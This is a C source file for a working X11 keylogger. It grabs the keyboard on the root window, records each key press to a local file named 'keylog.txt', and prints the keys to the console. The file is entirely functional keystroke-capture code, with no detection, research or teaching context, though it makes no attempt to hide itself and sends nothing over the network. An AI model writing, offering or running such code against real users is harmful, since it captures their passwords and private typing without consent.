#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <X11/Xlib.h>
#include <X11/keysym.h>
#include <X11/Xutil.h>

// Global variables
Display *display = NULL;
FILE *file = NULL;
int running = 1;

// Cleanup function to release resources
void cleanup() {
    if (file != NULL) {
        fclose(file);
        printf("File closed.\n");
    }
    if (display != NULL) {
        XCloseDisplay(display);
        printf("Display closed.\n");
    }
    printf("Program exited cleanly.\n");
}

// Signal handler for neat termination
void handle_signal(int signal) {
    printf("\nSignal %d received. Cleaning up and exiting...\n", signal);
    running = 0;  // Stops the main loop
}

// Function to log a key to the file
void log_key(const char *key) {
    if (file != NULL) {
        if (fprintf(file, "%s\n", key) < 0) {
            perror("Error writing to file");
        }
        fflush(file);  // make sure data is written immediately
    }
}

int main() {
    Window root;
    XEvent event;

    // Open the X display
    display = XOpenDisplay(NULL);
    if (display == NULL) {
        fprintf(stderr, "Unable to open X display\n");
        return 1;
    }

    // Open the root window
    root = DefaultRootWindow(display);

    // Sets the input mask to listen for key press and release events
    XSelectInput(display, root, KeyPressMask | KeyReleaseMask);

    // Grabs the keyboard input
    if (XGrabKeyboard(display, root, True, GrabModeAsync, GrabModeAsync, CurrentTime) != GrabSuccess) {
        fprintf(stderr, "Failed to grab keyboard\n");
        XCloseDisplay(display);
        return 1;
    }

    // Open the log file
    file = fopen("keylog.txt", "a");
    if (file == NULL) {
        perror("Error opening file");
        XCloseDisplay(display);
        return 1;
    }

    printf("Keylogger started. Logging to 'keylog.txt'. Press Ctrl+C to exit.\n");

    // Setup signal handler for neat termination
    signal(SIGINT, handle_signal);
    signal(SIGTERM, handle_signal);

    // Main event loop
    while (running) {
        XNextEvent(display, &event);

        if (event.type == KeyPress) {
            char buffer[128] = {0};
            KeySym keysym;
            int len = XLookupString(&event.xkey, buffer, sizeof(buffer), &keysym, NULL);

            if (len > 0) {
                printf("Key pressed: %s\n", buffer);  // Debugging line
                log_key(buffer);
            }
        }
    }

    // Cleanup resources
    cleanup();
    return 0;
}
